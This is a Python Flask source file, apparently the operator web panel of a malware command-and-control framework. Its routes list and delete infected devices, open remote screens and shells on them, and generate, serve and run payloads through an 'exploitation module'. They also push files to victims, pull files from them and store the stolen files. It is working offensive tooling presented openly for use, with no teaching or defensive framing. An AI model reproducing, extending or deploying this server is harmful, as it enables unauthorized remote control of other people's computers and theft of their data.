from flask import Flask, render_template, request, redirect, send_from_directory, session, url_for, jsonify
import eventlet
import socketio
from c2 import C2
import os
import threading
import json
from encryption import encrypt_messages

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for session management
sio = socketio.Server(cors_allowed_origins="*", logger=False, max_http_buffer_size=1e8)

keys = encrypt_messages()
public_key = keys.receive_public_key()
private_key = keys.receive_private_key()

malware = C2(sio, keys)

# Helper function to check if user is logged in
def is_logged_in():
    credentials = get_credentials()
    return ("logged_in" in session and session["logged_in"]) or (not credentials["settings"]["require_login"])

# Function to read credentials from the JSON file
def get_credentials():
    try:
        with open("config.json", "r") as file:
            credentials = json.load(file)
        return credentials
    except FileNotFoundError:
        return None

@app.route("/")
def index():
    if not is_logged_in():
        return redirect(url_for('login'))  # Redirect to login page if not logged in
    credentials = get_credentials()  # Fetch credentials from config.json
    pem_data = credentials.get("pem", {})
    return render_template("index.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"], pem_data=pem_data)

@app.route("/key")
def return_key():
    with open("./encryption/public_key.pem") as file:
        return file.readlines()

@app.route("/files")
def upload():
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("upload.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"])

@app.route("/payload")
def payload():
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("payload.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])

@app.route("/screen/<path:path>")
def screen(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    devices = malware.list_devices()
    if path in devices:
        return render_template("screen.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
    else:
        return redirect("/")

@app.route("/terminal/<path:path>")
def terminal(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    devices = malware.list_devices()
    if path in devices:
        return render_template("terminal.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
    else:
        return redirect("/")

@app.route("/term/<path:path>")
def term(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("jterm.html", style=get_credentials()["style"]["light_mode"])

@app.route("/client/<path:filename>")
def client(filename):
    return send_from_directory("templates/client", filename)

@app.route("/pem/<path:filename>")
def pem(filename):
    return send_from_directory("pem", filename)

@app.route("/get_payloads/<path:filename>")
def get_payloads(filename):
    return send_from_directory("payloads", filename, as_attachment=True)

@app.route("/devices", methods=["POST"])
def post():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        return jsonify(result=malware.list_all_devices()), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/delete", methods=["POST"])
def delete():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        malware.delete_device(data["device_id"])
        return jsonify(result='Device deleted successfully'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/ctrl", methods=["POST"])
def ctrl():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        malware.ctrl(data)
        return jsonify(result='Shell restarted successfully'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/payload", methods=["POST"])
def payload1():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        malware.payload(data)
        return jsonify(result='Payload has started generating. This may take upwards of 5 minutes.'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/download", methods=["POST"])
def download1():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        threading.Thread(target=malware.generate, args=(data,)).start()
        return jsonify(result='Payload has started generating. This may take upwards of 5 minutes.'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/list_payloads", methods=["POST"])
def list_payloads():
    if not is_logged_in():
        return redirect(url_for('login'))
    try:
        return jsonify(result=os.listdir("payloads")), 200
    except:
        return jsonify(result=[]), 200

@app.route("/explotation_module", methods=["POST"])
def send_explotation_module():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        malware.explotation_module(data)
        return jsonify(result='Payload executed successfully. Note, this may still mean that the payload failed during execution'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/upload_file", methods=["POST"])
def upload_file():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request
        malware.upload_file(data)
        return jsonify(result='File uploaded successfully'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/download_file", methods=["POST"])
def download_file():
    try:
        if not is_logged_in():
            return redirect(url_for('login'))
        data = request.get_json()
        malware.download_file(data)
        return jsonify(result='File downloaded successfully'), 200
    except Exception as err:
        return jsonify(result=str(err)), 500

@app.route("/get_downloaded_files/<path:filename>")
def get_downloaded_files(filename):
    if not is_logged_in():
        return redirect(url_for('login'))
    return send_from_directory("files_saved", filename, as_attachment=True)

@app.route("/list_files", methods=["POST"])
def list_files():
    if not is_logged_in():
        return redirect(url_for('login'))
    try:
        return jsonify(result=os.listdir("files_saved")), 200
    except:
        return jsonify(result=[]), 200

# Route for logging in
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        credentials = get_credentials()

        if credentials and username == credentials["auth"]["username"]:
            if password == credentials["auth"]["password"]:
                session["logged_in"] = True  # Set session variable
                return redirect(url_for('index'))  # Redirect to the homepage after login
            else:
                return render_template("login.html", style=get_credentials()["style"]["light_mode"], error_message="Password is incorrect")
        else:
            return render_template("login.html", style=get_credentials()["style"]["light_mode"], error_message="User not found")

    # If GET request, show login form
    if not get_credentials()["settings"]["require_login"]:
       return redirect(url_for('index'))

    return render_template("login.html", style=get_credentials()["style"]["light_mode"])

# Route for logging out
@app.route("/logout")
def logout():
    session.pop("logged_in", None)  # Remove session
    return redirect(url_for('login'))  # Redirect to login page

if __name__ == "__main__":
    flaskApp = socketio.Middleware(sio, app)
    eventlet.wsgi.server(eventlet.listen(("0.0.0.0", get_credentials()["settings"]["port"])), flaskApp)
